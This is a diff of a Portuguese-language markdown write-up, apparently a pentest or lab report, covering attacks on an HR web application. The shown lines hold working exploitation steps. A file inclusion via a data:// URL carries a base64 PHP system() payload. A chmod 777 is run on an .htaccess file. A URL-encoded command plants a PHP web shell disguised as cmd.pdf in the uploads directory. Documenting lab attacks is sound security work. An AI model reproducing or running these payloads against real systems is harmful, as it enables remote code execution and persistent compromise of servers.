@@ -85,9 +85,10 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/.htaccess
 ```
 
-📌 Resposta esperada:  
+📌 Resposta :  
 ```
--rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess
+    -rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess
+
 ```
 
 ---
@@ -96,10 +97,15 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 
 Comando utilizado para envio do **cmd.pdf**:  
 ```
+
+    ** conteudo do cmd: <?php system($_GET['cmd']); ?> **
+
+envio desse conteudo:
+
 http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%25PDF-1.4%0A%25%E2%E3%CF%D3%0A%0A%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C%2Fform%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C%2Fpre%3E%22%3B%20%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fcmd.pdf
 ```
 
-🔗 Acesso ao arquivo: [http://rh.businesscorp.com.br/uploads/cmd.pdf](http://rh.businesscorp.com.br/uploads/cmd.pdf)  
+🔗 Acesso ao arquivo: http://rh.businesscorp.com.br/uploads/cmd.pdf 
 
 <p align="center">
   <img width="488" height="132" alt="image" src="https://github.com/user-attachments/assets/ab571ec0-a668-4244-98ab-ffc7f5c209ec" />
@@ -123,7 +129,7 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 
 - Depois:  
 <p align="center">
-  <img width="374" height="137" alt="image" src="https://github.com/user-attachments/assets/7bdde745-c483-49c8-8099-30cf16501345" />
+  <img width="430" height="163" alt="image" src="https://github.com/user-attachments/assets/f9528674-fdc2-40a8-a4e3-e33de04431b5" />
 </p>
 
 ---
